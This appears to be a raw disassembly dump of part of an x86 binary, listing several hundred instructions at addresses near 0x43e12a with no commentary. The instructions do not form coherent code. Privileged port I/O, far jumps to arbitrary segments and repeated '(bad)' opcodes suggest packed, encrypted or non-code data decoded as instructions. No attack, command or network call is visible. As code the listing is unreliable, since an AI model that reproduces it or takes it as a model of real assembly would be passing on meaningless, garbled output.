  43e12a:	idiv   BYTE PTR [edx-0x1c]
  43e12d:	xchg   esi,eax
  43e12e:	test   al,0xe9
  43e130:	mov    DWORD PTR [ebx],eax
  43e132:	adc    BYTE PTR [eax+0x7f],cl
  43e135:	inc    esp
  43e136:	cmp    BYTE PTR [ecx-0x19cdfcc0],al
  43e13c:	hlt    
  43e13d:	mov    eax,0xf59775db
  43e142:	pop    ds
  43e143:	retf   
  43e144:	ret    
  43e145:	arpl   WORD PTR [ebp+edi*1-0x4a],dx
  43e149:	sbb    eax,0x8c6ed567
  43e14e:	adc    bh,BYTE PTR [eax-0x19]
  43e151:	in     eax,dx
  43e152:	pushw  cs
  43e154:	mov    BYTE PTR [ebp+0x26],bh
  43e157:	xchg   BYTE PTR [eax-0x40b5bc72],ch
  43e15d:	dec    ecx
  43e15e:	sahf   
  43e15f:	pushf  
  43e160:	retf   0x9002
  43e163:	mov    esi,DWORD PTR [ecx-0x771afa81]
  43e169:	pop    ebp
  43e16a:	and    esp,esp
  43e16c:	out    0xfb,al
  43e16e:	repz dec ebp
  43e170:	rol    BYTE PTR ds:0xa34cf306,cl
  43e176:	pop    ds
  43e177:	test   cl,cl
  43e179:	push   es
  43e17a:	pusha  
  43e17b:	outs   dx,DWORD PTR ds:[esi]
  43e17c:	into   
  43e17d:	ret    
  43e17e:	(bad)  
  43e17f:	addr16 sbb bh,bl
  43e182:	ins    DWORD PTR es:[edi],dx
  43e183:	hlt    
  43e184:	sub    edx,DWORD PTR [eax+ebx*1]
  43e187:	out    dx,al
  43e188:	out    dx,al
  43e189:	es mov al,0x77
  43e18c:	push   ebx
  43e18d:	test   ebp,esp
  43e18f:	loopne 0x43e1f9
  43e191:	xor    eax,DWORD PTR [ebx+0x454640d4]
  43e197:	adc    bl,ch
  43e199:	(bad)  
  43e19a:	mov    ch,0x92
  43e19c:	mov    ebp,esi
  43e19e:	fwait
  43e19f:	jo     0x43e13c
  43e1a1:	ds mov cl,0xe4
  43e1a4:	jmp    0xf2930dae
  43e1a9:	or     eax,0x175a49c0
  43e1ae:	test   DWORD PTR fs:[edi+ebx*8],ebx
  43e1b2:	mov    ds:0x305ad46,eax
  43e1b7:	mov    bl,0x58
  43e1b9:	add    DWORD PTR [edx-0x38],edx
  43e1bc:	pop    ebp
  43e1bd:	into   
  43e1be:	push   0x400a8482
  43e1c3:	jecxz  0x43e151
  43e1c5:	gs or  edx,eax
  43e1c8:	xchg   esi,eax
  43e1c9:	inc    esp
  43e1ca:	dec    esp
  43e1cb:	adc    al,0xa4
  43e1cd:	jnp    0x43e241
  43e1cf:	aad    0x1a
  43e1d1:	sar    edx,0xd0
  43e1d4:	jp     0x43e1be
  43e1d6:	cld    
  43e1d7:	push   ecx
  43e1d8:	xchg   edi,eax
  43e1d9:	mov    edi,0xc5fd81a8
  43e1de:	pop    ebp
  43e1df:	sahf   
  43e1e0:	jl     0x43e234
  43e1e2:	pop    es
  43e1e3:	mov    eax,0x84a01099
  43e1e8:	dec    eax
  43e1e9:	inc    edi
  43e1ea:	cmp    eax,0x64cb96bb
  43e1ef:	neg    DWORD PTR [esi+0x72daad48]
  43e1f5:	cmp    BYTE PTR [edx-0x4b],0x94
  43e1f9:	sbb    al,0x1a
  43e1fb:	not    DWORD PTR [ecx-0x1f]
  43e1fe:	add    ecx,edi
  43e200:	fldcw  WORD PTR [esi]
  43e202:	outs   dx,BYTE PTR ds:[esi]
  43e203:	mov    dh,0x9d
  43e205:	mov    eax,ebx
  43e207:	rcl    BYTE PTR [esi+0x2b],0x65
  43e20b:	sub    esi,esp
  43e20d:	adc    al,0x2b
  43e20f:	test   eax,0xc3d4ef38
  43e215:	enter  0xdf9,0x9d
  43e219:	rol    ecx,1
  43e21b:	adc    DWORD PTR [eax+0x2a93b761],ecx
  43e221:	jnp    0x43e1be
  43e223:	cmp    eax,DWORD PTR [edx+0x3]
  43e226:	cli    
  43e227:	fs mov ebx,0x51664571
  43e22d:	aam    0x1f
  43e22f:	aaa    
  43e230:	adc    eax,0x64f06d94
  43e235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e236:	out    dx,eax
  43e237:	stos   DWORD PTR es:[edi],eax
  43e238:	mov    bh,0x52
  43e23a:	push   ds
  43e23b:	cli    
  43e23c:	push   cs
  43e23d:	adc    esp,0x6c
  43e240:	outs   dx,DWORD PTR ds:[esi]
  43e241:	push   ebx
  43e242:	add    DWORD PTR [edx+0x2f67b88],esp
  43e248:	jecxz  0x43e254
  43e24a:	xor    DWORD PTR [esi-0x67],edx
  43e24d:	add    eax,0x46cab210
  43e252:	(bad)  
  43e254:	ss repnz aas 
  43e257:	dec    BYTE PTR [ecx-0x5d8bf2ad]
  43e25d:	pop    es
  43e25e:	xchg   edi,eax
  43e25f:	pop    ebp
  43e260:	cmc    
  43e261:	add    eax,0xdbcfb47c
  43e266:	sti    
  43e267:	std    
  43e268:	mov    esi,DWORD PTR [esi+ebx*1]
  43e26b:	(bad)  
  43e26c:	jmp    0x6ac8:0x6fbb374d
  43e273:	pop    eax
  43e274:	cwde   
  43e275:	and    al,0x1e
  43e277:	lea    ebp,[esi]
  43e279:	xor    bl,dl
  43e27b:	inc    ecx
  43e27c:	mov    es,WORD PTR [ebp+0x1e]
  43e27f:	pop    edi
  43e280:	sub    BYTE PTR [ecx+0x48ce3f08],al
  43e286:	xchg   al,dh
  43e288:	loop   0x43e287
  43e28a:	mov    ds:0x4987e8d5,al
  43e28f:	ss lock ret 
  43e292:	pushf  
  43e293:	leave  
  43e294:	mov    BYTE PTR [ecx],bh
  43e296:	jbe    0x43e235
  43e298:	sub    BYTE PTR fs:0xc03e735,0x50
  43e2a0:	in     al,0x9b
  43e2a2:	dec    ebp
  43e2a3:	mov    esi,0xc743e5fa
  43e2a8:	mov    BYTE PTR [ebp+0xa3e472f],dl
  43e2ae:	mov    edi,0x3b875c73
  43e2b3:	mov    eax,ds:0x7626dc88
  43e2b8:	div    BYTE PTR [edx+edx*4]
  43e2bb:	xor    BYTE PTR [eax-0x1efc254d],cl
  43e2c1:	shr    DWORD PTR [eax-0x17fc3044],cl
  43e2c7:	push   cs
  43e2c8:	sbb    ecx,DWORD PTR [esi]
  43e2ca:	fnsave [edx-0x75]
  43e2cd:	in     eax,dx
  43e2ce:	call   0x2978:0x6583766a
  43e2d5:	mov    cl,0x66
  43e2d7:	mov    ebp,0x4e9db8d7
  43e2dc:	sub    edx,DWORD PTR [ebx]
  43e2de:	outs   dx,DWORD PTR ds:[esi]
  43e2df:	or     BYTE PTR [esi+esi*8],0x5c
  43e2e3:	aad    0x50
  43e2e5:	shr    ch,1
  43e2e7:	mov    edx,0x2f51fde4
  43e2ec:	mov    BYTE PTR [ebp-0x43b1fb35],dl
  43e2f2:	fwait
  43e2f3:	mov    ecx,0xea100290
  43e2f8:	dec    ebx
  43e2f9:	mov    ds:0x3e9eedea,eax
  43e2fe:	pop    ds
  43e2ff:	jmp    0x3c782eae
  43e304:	add    BYTE PTR [eax+0x1],dh
  43e307:	adc    dl,dh
  43e309:	add    eax,0x3bc2b880
  43e30e:	xchg   ebx,eax
  43e30f:	lds    esp,FWORD PTR [ecx+0x6d]
  43e312:	cs inc edi
  43e314:	hlt    
  43e315:	xchg   DWORD PTR [ebx-0x2c],esp
  43e318:	stos   BYTE PTR es:[edi],al
  43e319:	mov    eax,0xb4363a35
  43e31e:	(bad)  
  43e320:	sbb    BYTE PTR [ecx],al
  43e322:	into   
  43e323:	ret    
  43e324:	sahf   
  43e325:	scas   eax,DWORD PTR es:[edi]
  43e326:	push   0x7eab89fe
  43e32b:	adc    eax,0x59022bba
  43e330:	push   ebx
  43e331:	add    bh,BYTE PTR [eax+0x64]
  43e334:	cmp    eax,0x77ff4cd
  43e339:	pop    esi
  43e33a:	push   ds
  43e33b:	ins    DWORD PTR es:[edi],dx
  43e33c:	fcmovnu st,st(2)
  43e33e:	inc    edi
  43e33f:	scas   al,BYTE PTR es:[edi]
  43e340:	call   0xe919c5cf
  43e345:	adc    eax,0x898306f6
  43e34a:	pop    es
  43e34b:	in     eax,dx
  43e34c:	mov    ah,0xb9
  43e34e:	and    al,0x82
  43e350:	mov    DWORD PTR [eax+0x73],ebp
  43e353:	sub    al,0x30
  43e355:	icebp  
  43e356:	xchg   edi,eax
  43e357:	aad    0x9e
  43e359:	aaa    
  43e35a:	mov    ecx,0x1d098dc3
  43e35f:	mov    esi,0x81f1758e
  43e364:	xchg   ebp,eax
  43e365:	jp     0x43e2f7
  43e367:	mov    ah,0x0
  43e369:	inc    edx
  43e36a:	xchg   ebx,eax
  43e36b:	aad    0x27
  43e36d:	nop
  43e36e:	into   
  43e36f:	in     al,0x3
  43e371:	mov    ds:0x989bcc9,eax
  43e376:	cld    
  43e377:	or     al,0x69
  43e379:	mov    ebx,0x1e2f7e2
  43e37e:	adc    al,0x73
  43e380:	call   0x497a8abc
  43e385:	xchg   BYTE PTR [ebp+edx*1-0x77],ah
  43e389:	sub    ecx,DWORD PTR [edx+0x37d15d38]
  43e38f:	stc    
  43e390:	outs   dx,DWORD PTR ds:[esi]
  43e391:	add    edx,DWORD PTR [ecx+edi*2-0x762a8579]
  43e398:	pusha  
  43e399:	fs sbb edi,esi
  43e39c:	mov    BYTE PTR ds:0xe072336f,bh
  43e3a2:	fwait
  43e3a3:	or     edi,DWORD PTR ds:0xed4a7203
  43e3a9:	fnstsw WORD PTR [eax]
  43e3ab:	out    dx,eax
  43e3ac:	push   edi
  43e3ad:	test   BYTE PTR [eax+0x13af249],dh
  43e3b3:	ret    0x8dd1
  43e3b6:	push   cs
  43e3b7:	les    ecx,FWORD PTR [eax-0x2d4573c5]
  43e3bd:	fcomp  QWORD PTR [ebx+0x11494498]
  43e3c3:	cmp    ecx,DWORD PTR [ebx+edi*2-0x174f7b62]
  43e3ca:	xor    edx,DWORD PTR [edi-0x77]
  43e3cd:	xchg   edi,eax
  43e3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e3cf:	imul   esi,esp,0xffffffd4
  43e3d2:	inc    ecx
  43e3d3:	out    dx,al
  43e3d4:	adc    al,BYTE PTR [edx]
  43e3d6:	mov    cs,WORD PTR [ecx+0x19e2057a]
  43e3dc:	int    0xa9
  43e3de:	pop    ds
  43e3df:	push   ebx
  43e3e0:	fld    st(3)
  43e3e2:	iret   
  43e3e3:	mov    edx,esp
  43e3e5:	xor    esp,DWORD PTR [esp+edx*8-0xe]
  43e3e9:	loopne 0x43e3a1
  43e3eb:	shl    BYTE PTR fs:[eax+0x17],0xc
  43e3f0:	mov    cl,BYTE PTR [ebx]
  43e3f2:	das    
  43e3f3:	fwait
  43e3f4:	scas   al,BYTE PTR es:[edi]
  43e3f5:	inc    ecx
  43e3f6:	stc    
  43e3f7:	into   
  43e3f8:	add    cx,bp
  43e3fb:	mov    dh,0xcb
  43e3fd:	add    bh,BYTE PTR [edx+0x796a9553]
  43e403:	neg    ah
  43e405:	mov    DWORD PTR [ebx],ebx
  43e407:	ja     0x43e391
  43e409:	icebp  
  43e40a:	mov    ah,0x32
  43e40c:	and    bh,BYTE PTR [ebp-0x36]
  43e40f:	pop    esp
  43e410:	add    eax,0xedb21803
  43e415:	test   eax,0xdecf4681
  43e41a:	pop    ds
  43e41b:	arpl   WORD PTR [edx+0x3238e0ef],sp
  43e421:	push   cs
  43e422:	icebp  
  43e423:	aad    0x94
  43e425:	cmc    
  43e426:	loopne 0x43e3db
  43e428:	daa    
  43e429:	lock sub ecx,DWORD PTR [edi]
  43e42c:	mov    BYTE PTR [edi],dl
  43e42e:	adc    al,0xea
  43e430:	inc    eax
  43e431:	xchg   esp,eax
  43e432:	es fwait
  43e434:	xchg   ebx,eax
  43e435:	sub    DWORD PTR [eax],ebp
  43e437:	add    eax,DWORD PTR [edi]
  43e439:	cmp    al,0x1f
  43e43b:	inc    edx
  43e43c:	outs   dx,DWORD PTR ds:[esi]
  43e43d:	sar    BYTE PTR [edi],cl
  43e43f:	fld    TBYTE PTR [ebx-0x1a]
  43e442:	pusha  
  43e443:	xchg   ebp,eax
  43e444:	mov    dh,0xd9
  43e446:	jb     0x43e4b3
  43e448:	add    eax,0x3c66294
  43e44d:	add    dh,BYTE PTR [esi-0x6e]
  43e450:	and    esp,ebx
  43e452:	add    eax,0x659a85dc
  43e457:	idiv   DWORD PTR [esi+0xb]
  43e45a:	and    BYTE PTR [esi],dh
  43e45c:	je     0x43e4a1
  43e45e:	icebp  
  43e45f:	xchg   edx,eax
  43e460:	sahf   
  43e461:	add    eax,0x4b3d7c94
  43e466:	inc    ecx
  43e467:	add    edi,DWORD PTR [edx+0x46f11fea]
  43e46d:	lock or eax,0xe4da5699
  43e473:	aam    0xb8
  43e475:	stos   BYTE PTR es:[edi],al
  43e476:	or     DWORD PTR [edi-0x5f5f9286],esi
  43e47c:	xor    DWORD PTR [edi-0x2b213aed],0xffffffa0
  43e483:	lock stos BYTE PTR es:[edi],al
  43e485:	jne    0x43e463
  43e487:	and    al,dl
  43e489:	gs xor edx,edi
  43e48c:	cld    
  43e48d:	xor    al,BYTE PTR [edi-0x65]
  43e490:	mov    edx,0x8ccf6163
  43e495:	and    al,0xc8
  43e497:	mov    ebx,esp
  43e499:	fsub   DWORD PTR [ecx]
  43e49b:	addr16 inc eax
  43e49d:	jecxz  0x43e512
  43e49f:	aam    0xb6
  43e4a1:	(bad)  
  43e4a2:	and    eax,0xd4f0ec0a
  43e4a7:	mov    esi,0x9c46d78e
  43e4ac:	fs inc edi
  43e4ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e4af:	adc    eax,0xd5621028
  43e4b4:	jns    0x43e471
  43e4b6:	aam    0x95
  43e4b8:	call   0x6a71:0x88d86f2c
  43e4bf:	out    dx,al
  43e4c0:	mov    bl,0x98
  43e4c2:	pop    edx
  43e4c3:	adc    edx,ebp
  43e4c5:	add    ah,BYTE PTR [esi+0x5f]
  43e4c8:	lds    esp,FWORD PTR [ecx+0x25]
  43e4cb:	retf   
  43e4cc:	call   0x656b:0x69236063
  43e4d3:	int3   
  43e4d4:	repz jb 0x43e486
  43e4d7:	enter  0x2a8,0x36
  43e4db:	repz cmp cl,BYTE PTR [edx+ebx*2]
  43e4df:	add    esp,0x8
  43e4e2:	gs jecxz 0x43e4bc
  43e4e5:	xlat   BYTE PTR ds:[ebx]
  43e4e6:	(bad)  
  43e4e7:	jg     0x43e550
  43e4e9:	inc    edx
  43e4ea:	(bad)  
  43e4ec:	and    al,0x2
  43e4ee:	jl     0x43e524
  43e4f0:	lea    esi,[ebx]
  43e4f2:	je     0x43e47a
  43e4f4:	jne    0x43e4e0
  43e4f6:	addr16 pop ebp
  43e4f8:	jo     0x43e517
  43e4fa:	mov    ecx,0xe81a89a8
  43e4ff:	inc    edx
  43e500:	jns    0x43e503
  43e502:	jl     0x43e512
  43e504:	xor    ah,ch
  43e506:	jo     0x43e4fe
  43e508:	inc    ecx
  43e509:	arpl   WORD PTR [eax-0x177e4ec9],si
  43e50f:	adc    eax,0x817bf908
  43e514:	es push 0x8785d485
  43e51a:	(bad)  
  43e51b:	mov    al,0xf1
  43e51d:	fdivr  DWORD PTR [edx+esi*2-0x10]
  43e521:	aaa    
  43e522:	out    0x3c,eax
  43e524:	adc    ax,0x10a2
  43e528:	mov    esp,0x8944699b
  43e52d:	add    DWORD PTR [edi-0x11],edi
  43e530:	pop    edx
  43e531:	clc    
  43e532:	or     dl,ah
  43e534:	pop    edi
  43e535:	ss mov eax,0x20609ebb
  43e53b:	sbb    eax,0x53927f8a
  43e540:	mov    al,0x26
  43e542:	pop    edx
  43e543:	data16 jo 0x43e4f3
  43e546:	fs lock out 0x2,al
  43e54a:	push   cs
  43e54b:	icebp  
  43e54c:	call   0x6088:0xf818964d
  43e553:	push   ebp
  43e554:	mov    eax,ds:0xd3ff91c4
  43e559:	dec    ecx
  43e55a:	sub    al,0xc8
  43e55c:	mov    dh,0x2
  43e55e:	dec    edx
  43e55f:	into   
  43e560:	iret   
  43e561:	mov    ds:0xd985d86b,al
  43e566:	jl     0x43e54d
  43e568:	es mov bl,ah
  43e56b:	xchg   edi,eax
  43e56c:	or     bh,dl
  43e56e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e56f:	popf   
  43e570:	push   0x5b10ef98
  43e575:	add    esi,DWORD PTR [ebx+ebx*1]
  43e578:	dec    edi
  43e579:	mov    eax,ds:0xa3901025
  43e57e:	pusha  
  43e57f:	xor    eax,0xad0f832
  43e584:	sub    bp,WORD PTR ds:0x6805e017
  43e58b:	inc    edi
  43e58c:	push   eax
  43e58d:	sbb    eax,DWORD PTR gs:[ebx+ecx*2+0x38140666]
  43e595:	sub    al,0xa7
  43e597:	aad    0x30
  43e599:	adc    eax,0x8baef577
  43e59e:	jge    0x43e574
  43e5a0:	mov    es,WORD PTR [eax-0x32]
  43e5a3:	jl     0x43e5ae
  43e5a5:	shl    DWORD PTR [esi-0x30],0x88
  43e5a9:	fbstp  TBYTE PTR [ecx+0x45]
  43e5ac:	fst    QWORD PTR [edi-0x4d]
  43e5af:	repnz xchg esi,eax
  43e5b1:	ret    0xd44e
  43e5b4:	mov    bl,0x65
  43e5b6:	aad    0x32
  43e5b8:	sbb    ecx,ebp
  43e5ba:	mov    DWORD PTR [ecx-0x55dd9878],ecx
  43e5c0:	ss sti 
  43e5c2:	mov    ecx,DWORD PTR ds:0x41605a1
  43e5c8:	push   esi
  43e5c9:	std    
  43e5ca:	mov    ch,0xd3
  43e5cc:	fwait
  43e5cd:	mov    al,ds:0xb91ebb67
  43e5d2:	fwait
  43e5d3:	iret   
  43e5d4:	or     DWORD PTR [ebx+0x5c09dd2],ebp
  43e5da:	enter  0x2066,0xe0
  43e5de:	ror    BYTE PTR [eax-0x56e0fb3c],0xaf
  43e5e5:	out    dx,eax
  43e5e6:	pop    ss
  43e5e7:	or     eax,0xd4b5960c
  43e5ec:	pop    ax
  43e5ee:	cmp    esi,edi
  43e5f0:	fldcw  WORD PTR [edi]
  43e5f2:	scas   al,BYTE PTR es:[edi]
  43e5f3:	cmp    al,0x88
  43e5f5:	mov    ebx,DWORD PTR [ecx]
  43e5f7:	ss dec eax
  43e5f9:	xor    DWORD PTR [ebx],eax
  43e5fb:	mov    BYTE PTR [esi+0x3],bl
  43e5fe:	jp     0x43e584
  43e600:	bound  edi,QWORD PTR [edi-0x19b1b0bb]
  43e606:	jge    0x43e595
  43e608:	sub    eax,0xc9aeea47
  43e60d:	adc    eax,0x5a26fe9f
  43e612:	mov    bh,0xd4
  43e614:	jbe    0x43e5e9
  43e616:	jecxz  0x43e5fc
  43e618:	hlt    
  43e619:	cs dec ebp
  43e61b:	arpl   WORD PTR [eax-0x51],di
  43e61e:	pop    ds
  43e61f:	pop    ebp
  43e620:	(bad)  
  43e621:	jmp    0x9a27:0x2590f867
  43e628:	xor    edi,DWORD PTR ds:0x4508d453
  43e62e:	xor    eax,0x9cef1878
  43e633:	pushf  
  43e634:	mov    BYTE PTR [edi+0x2],dl
  43e637:	repnz mov esi,0xced491c2
  43e63d:	icebp  
  43e63e:	or     dh,BYTE PTR [esi+edi*8-0x5a]
  43e642:	mov    bh,0x63
  43e644:	mov    DWORD PTR [ebx-0x20],ebx
  43e647:	and    eax,0xeb93452b
  43e64c:	jno    0x43e650
  43e64e:	and    BYTE PTR [edi-0x5095c008],bh
  43e654:	adc    WORD PTR [esi],bx
  43e657:	dec    ecx
  43e658:	idiv   ecx
  43e65a:	(bad)  
  43e65b:	retf   0x90e0
  43e65e:	mov    eax,ds:0x8000ef75
  43e663:	je     0x43e65a
  43e665:	out    0x7b,al
  43e667:	and    ah,BYTE PTR [ebx-0x759d457b]
  43e66d:	pop    ebp
  43e66e:	mov    edi,DWORD PTR [esi]
  43e670:	and    DWORD PTR [ebx-0x7b],edi
  43e673:	jmp    0x293bbd01
  43e678:	shl    DWORD PTR [eax],1
  43e67a:	jne    0x43e677
  43e67c:	shl    DWORD PTR ds:0xf789d954,1
  43e682:	pop    edi
  43e683:	clc    
  43e684:	int3   
  43e685:	les    edx,FWORD PTR [esp+edx*8]
  43e688:	and    DWORD PTR [edi],esi
  43e68a:	es mov ecx,0xe4949097
  43e690:	mov    BYTE PTR [ebx],dh
  43e692:	push   0x24
  43e694:	mov    cl,0xcf
  43e696:	push   es
  43e697:	ss out 0x2,al
  43e69a:	les    eax,FWORD PTR [edx+esi*8+0x39]
  43e69e:	dec    eax
  43e69f:	and    BYTE PTR [edx-0x3f],bh
  43e6a2:	jbe    0x43e707
  43e6a4:	sub    BYTE PTR [edx-0x6f],ah
  43e6a7:	aad    0x73
  43e6a9:	outs   dx,DWORD PTR ds:[esi]
  43e6aa:	mov    ch,0x3b
  43e6ac:	stc    
  43e6ad:	add    eax,0x4be28746
  43e6b2:	mov    ds:0x65f63834,eax
  43e6b7:	add    eax,0xf6815a69
  43e6bc:	retf   0x6745
  43e6bf:	xchg   esp,eax
  43e6c0:	and    eax,0x92f341f3
  43e6c5:	add    BYTE PTR [eax+0xb],ah
  43e6c8:	addr16 in al,0x5e
  43e6cb:	pop    edx
  43e6cc:	jle    0x43e6b0
  43e6ce:	shr    bl,cl
  43e6d0:	mov    cl,ah
  43e6d2:	mov    dh,0x75
  43e6d4:	xchg   ebp,eax
  43e6d5:	ret    0x1770
  43e6d8:	jno    0x43e701
  43e6da:	pop    esi
  43e6db:	retf   
  43e6dc:	cmp    DWORD PTR [eax-0x13],esi
  43e6df:	in     eax,dx
  43e6e0:	and    BYTE PTR [ebx],al
  43e6e2:	loope  0x43e763
  43e6e4:	or     ecx,DWORD PTR [ebx+0x58]
  43e6e7:	mov    ecx,0xb060fded
  43e6ec:	into   
  43e6ed:	push   esp
  43e6ee:	jne    0x43e697
  43e6f0:	dec    ecx
  43e6f1:	sbb    al,0x22
  43e6f3:	dec    ebx
  43e6f4:	add    ecx,DWORD PTR [ecx-0x8d7dbfc]
  43e6fa:	(bad)  
  43e6fb:	xchg   esi,eax
  43e6fc:	push   0x879b6c2f
  43e701:	dec    ebp
  43e702:	gs jge 0x43e74d
  43e705:	outs   dx,DWORD PTR ds:[esi]
  43e706:	inc    edi
  43e707:	mov    dx,0xf405
  43e70b:	fmulp  st(7),st
  43e70d:	loope  0x43e6ce
  43e70f:	int3   
  43e710:	mov    esi,DWORD PTR [edi+0x2d9da365]
  43e716:	and    esi,DWORD PTR [edi-0x5b]
  43e719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e71a:	adc    bh,BYTE PTR [ebx+0x63]
  43e71d:	add    ch,BYTE PTR [ebp+edx*8+0x75]
  43e721:	dec    ebp
  43e722:	push   edi
  43e723:	cld    
  43e724:	lds    esi,FWORD PTR [ebx]
  43e726:	pop    ds
  43e727:	inc    ebp
  43e728:	sar    BYTE PTR [esi-0x97f877b],0x96
  43e72f:	aad    0x37
  43e731:	out    dx,al
  43e732:	adc    DWORD PTR [edi+0x74],ebx
  43e735:	aam    0xff
  43e737:	int3   
  43e738:	repz sub ebx,DWORD PTR [edx-0x35b4cd2c]
  43e73f:	inc    esi
  43e740:	jle    0x43e70c
  43e742:	inc    esi
  43e743:	aad    0xe0
  43e745:	sub    DWORD PTR [ebx],0x5b3850a2
  43e74b:	mov    al,ds:0xc566fe7a
  43e750:	test   DWORD PTR [esi+0x1a],ebp
  43e753:	adc    BYTE PTR [eax+0x4290fa17],bl
  43e759:	fwait
  43e75a:	rcl    DWORD PTR [ebp-0x5a],cl
  43e75d:	aam    0x45
  43e75f:	inc    esi
  43e760:	mov    ds,WORD PTR [ecx+0x59]
  43e763:	test   DWORD PTR [edx+ebx*1-0x46],edi
  43e767:	lds    esp,FWORD PTR [edx+0x8d58bb9]
  43e76d:	jae    0x43e72e
  43e76f:	imul   ebp,DWORD PTR [ecx-0x19f1f1fd],0x2
  43e776:	or     dh,bl
  43e778:	cmp    eax,0xa0456558
  43e77d:	mov    ds,WORD PTR [edi]
  43e77f:	mov    bh,0xcd
  43e781:	inc    edi
  43e782:	(bad)  
  43e783:	in     al,0xb5
  43e785:	les    edx,FWORD PTR [edx+0xe05d66b]
  43e78b:	hlt    
  43e78c:	std    
  43e78d:	sar    BYTE PTR cs:[esi],1
  43e790:	xchg   edx,eax
  43e791:	add    eax,0x41aac16a
  43e796:	xchg   ebp,eax
  43e797:	mov    cl,0x79
  43e799:	ja     0x43e7b9
  43e79b:	and    ecx,DWORD PTR [eax-0x411fc73a]
  43e7a1:	int3   
  43e7a2:	in     al,0xab
  43e7a4:	xor    ecx,DWORD PTR [edi+0x46]
  43e7a7:	push   ds
  43e7a8:	sahf   
  43e7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e7aa:	aam    0x60
  43e7ac:	call   DWORD PTR [ecx+0x1e]
  43e7af:	pop    edi
  43e7b0:	push   ebp
  43e7b1:	retf   0x37ed
  43e7b4:	xor    ebx,0xffffffe9
  43e7b7:	pop    esp
  43e7b8:	pop    edx
  43e7b9:	and    DWORD PTR [ebx],ebx
  43e7bb:	call   0xdb7f:0xd713796a
  43e7c2:	inc    ebp
  43e7c3:	(bad)  
  43e7c4:	enter  0x1f8b,0xe5
  43e7c8:	retf   0x55dc
  43e7cb:	adc    DWORD PTR [eax],esp
  43e7cd:	loope  0x43e7f8
  43e7cf:	lods   eax,DWORD PTR ds:[esi]
  43e7d0:	or     dh,BYTE PTR [esi]
  43e7d2:	cmp    al,0x3d
  43e7d4:	inc    ecx
  43e7d5:	mov    cl,0x80
  43e7d7:	mov    cl,BYTE PTR [edi+eiz*1]
  43e7da:	push   edi
  43e7db:	in     eax,0xe6
  43e7dd:	popa   
  43e7de:	lahf   
  43e7df:	pop    ss
  43e7e0:	sbb    BYTE PTR ds:0x2d55af2,al
  43e7e6:	int3   
  43e7e7:	pop    ds
  43e7e8:	fst    QWORD PTR [ebp-0x509aed6f]
  43e7ee:	pop    ds
  43e7ef:	rcr    DWORD PTR [edi+0x21],0x5c
  43e7f3:	adc    eax,0xafa4f096
  43e7f8:	stc    
  43e7f9:	mov    esp,0x22ae770
  43e7fe:	js     0x43e7d2
  43e800:	sahf   
  43e801:	ror    DWORD PTR [esi-0x66],0x68
  43e805:	jmp    0x591:0x5a65ab6d
  43e80c:	mov    ebp,edx
  43e80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e80f:	push   edi
  43e810:	add    BYTE PTR ds:0x58e7ec18,dl
  43e816:	test   eax,0x28cea037
  43e81b:	push   ss
  43e81c:	dec    eax
  43e81d:	repz xchg esp,eax
  43e81f:	push   esi
  43e820:	mov    BYTE PTR [ebp+0x75],ch
  43e823:	or     dl,dh
  43e825:	push   ecx
  43e826:	jle    0x43e822
  43e828:	push   edx
  43e829:	cmp    ebx,edx
  43e82b:	lea    ebp,[esi+0xba160a0]
  43e831:	push   esp
  43e832:	out    0x3,eax
  43e834:	lds    edx,FWORD PTR [ecx]
  43e836:	xchg   ebp,eax
  43e837:	out    dx,eax
  43e838:	sub    BYTE PTR [edx],al
  43e83a:	lock jmp 0x2ae:0xbc8a2391
  43e842:	push   eax
  43e843:	scas   eax,DWORD PTR es:[edi]
  43e844:	dec    edi
  43e845:	jl     0x43e800
  43e847:	cli    
  43e848:	jp     0x43e82a
  43e84a:	popa   
  43e84b:	das    
  43e84c:	and    al,0x41
  43e84e:	repz fdiv st,st(3)
  43e851:	fnstcw WORD PTR [eax]
  43e853:	int    0x94
  43e855:	add    eax,0x428da70c
  43e85a:	cld    
  43e85b:	hlt    
  43e85c:	test   eax,ecx
  43e85e:	dec    ebp
  43e85f:	adc    eax,0x9b60bed4
  43e864:	ror    DWORD PTR [edi],0xf9
  43e867:	test   BYTE PTR [esi-0x1a4621fa],bl
  43e86d:	cmp    DWORD PTR [ecx+0x1f2e9459],eax
  43e873:	or     eax,0xefeadd24
  43e878:	mov    ecx,edx
  43e87a:	in     al,dx
  43e87b:	lds    ebp,FWORD PTR [edi+0x3d917022]
  43e881:	sti    
  43e882:	mov    bh,0x8a
  43e884:	imul   ebx,DWORD PTR [ecx-0x4c0684a0],0x6c2640a
  43e88e:	mov    edi,0x567381aa
  43e893:	sub    ah,0x3
  43e896:	mov    ch,BYTE PTR [esi+0x2f11e21d]
  43e89c:	mov    BYTE PTR ds:0xbe146720,ch
  43e8a2:	xlat   BYTE PTR fs:[ebx]
  43e8a4:	loope  0x43e8ab
  43e8a6:	xchg   esi,eax
  43e8a7:	and    ebp,DWORD PTR [edi+0x50]
  43e8aa:	jg     0x43e870
  43e8ac:	inc    ebp
  43e8ad:	jno    0x43e910
  43e8af:	(bad)  
  43e8b1:	fist   DWORD PTR [ebx]
  43e8b3:	(bad)  [ebx+0x56]
  43e8b6:	adc    al,0xd7
  43e8b8:	sub    ah,ch
  43e8ba:	mov    edi,0x72779fd5
  43e8bf:	mov    WORD PTR ds:0x89a6617e,cs
  43e8c5:	lods   eax,DWORD PTR ds:[esi]
  43e8c6:	mov    edx,0x95722a1a
  43e8cb:	mov    ch,0x21
  43e8cd:	add    ah,bh
  43e8cf:	jp     0x43e929
  43e8d1:	push   ebp
  43e8d2:	in     al,dx
  43e8d3:	mov    eax,ds:0x900092e2
  43e8d8:	mov    bh,dl
  43e8da:	and    ecx,ecx
  43e8dc:	jl     0x43e8f5
  43e8de:	xor    bh,BYTE PTR [edi-0x458b265c]
  43e8e4:	es daa 
  43e8e6:	sbb    DWORD PTR [esi+0x49],ecx
  43e8e9:	jmp    0x9a6bd7b0
  43e8ee:	pop    ds
  43e8ef:	push   edi
  43e8f0:	or     ecx,esp
  43e8f2:	push   ds
  43e8f3:	mov    dl,bh
  43e8f5:	mov    ch,0xf2
  43e8f7:	ror    ch,cl
